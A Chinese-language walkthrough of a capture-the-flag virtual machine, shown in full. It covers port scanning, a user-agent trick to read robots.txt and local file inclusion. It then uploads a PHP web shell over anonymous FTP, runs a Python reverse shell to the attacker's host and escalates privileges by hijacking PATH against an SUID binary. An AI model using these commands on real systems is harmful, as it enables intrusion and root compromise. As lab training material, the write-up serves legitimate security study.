VirtualBox双击打开，默认wifi桥接模式！用探测发现IP地址！alivecheck 1.6-快速扫描.jar
192.168.2.141

--------------------------------------------
--------------------------------------------
1、nmap 172.20.10.11 -p- -A

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))


--------------------------------------------
--------------------------------------------
2、web信息收集

dirb 和 nikto发现很多目录！

访问：
http://172.20.10.11/robots.txt
提示：
You are not a search engine! You can't read my robots.txt! 
提示不是对应的搜索引擎，无法查看相对应的信息！

那么有很多方法修改USER-agent的heard头部信息即可！


--------------------------------------------
--------------------------------------------
3、修改搜索引擎

Googlebot是网络检索器！接下来介绍两种方法！

1）curl修改user-agent

curl -s --user-agent Googlebot http://172.20.10.11/robots.txt
User-agent: *
Disallow: /secret_information/



2）浏览器修改搜索引擎

参考文章：
https://www.howtogeek.com/113439/how-to-change-your-browsers-user-agent-without-installing-any-extensions/



--------------------------------------------
--------------------------------------------
4、LFI文件包含枚举


http://172.20.10.11/secret_information/

发现页面点击：Engilsh

http://172.20.10.11/secret_information/?lang=en.php
URL中的lang参数调用en.php，LFI可能存在！


http://172.20.10.11/secret_information/?lang=/etc/passwd


http://172.20.10.11/secret_information/?lang=/etc/vsftpd.conf

# Point users at the directory we created earlier. anon_root=/var/ftp/ write_enable=YES 


--------------------------------------------
--------------------------------------------
5、LFI+FTP+包含出发shell

echo '<?php system($_GET['cmd']);?>' > dayu.php 
ftp 172.20.10.11
cd pub
put dayu.php


http://172.20.10.11/secret_information/?lang=/var/ftp/pub/dayu.php&cmd=id
回显：uid=33(www-data) gid=33(www-data) groups=33(www-data) 


http://172.20.10.11/secret_information/?lang=/var/ftp/pub/dayu.php&cmd=which python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.10.7",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import pty; pty.spawn("/bin/bash")'


--------------------------------------------
--------------------------------------------
6、内部信息收集

find / -perm -4000 2>/dev/null

[+] SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root        17K Feb  8  2020 /home/tom/rootshell

[+] Files inside others home (limit 20)
/home/tom/.bash_logout
/home/tom/.profile
/home/tom/.bashrc
/home/tom/rootshell
/home/tom/.ICEauthority
/home/tom/rootshell.c


--------------------------------------------
--------------------------------------------
7、代码审计+PATH提权

----------
cat /home/tom/rootshell.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
----------

根据这段代码，如果文件以Tom用户身份通过​​调用“whoami”程序的函数进行验证，那么将获得一个r（权限用户），否则它将打印当前登录的用户ID！

可以通过滥用PATH系统轻松利用此配置提权：

cd /tmp 
echo "printf "tom"" > whoami 
chmod 777 whoami

添加临时路径变量：
export PATH=/tmp:$PATH
echo path

cd /home/tom 
./rootshell 




















































































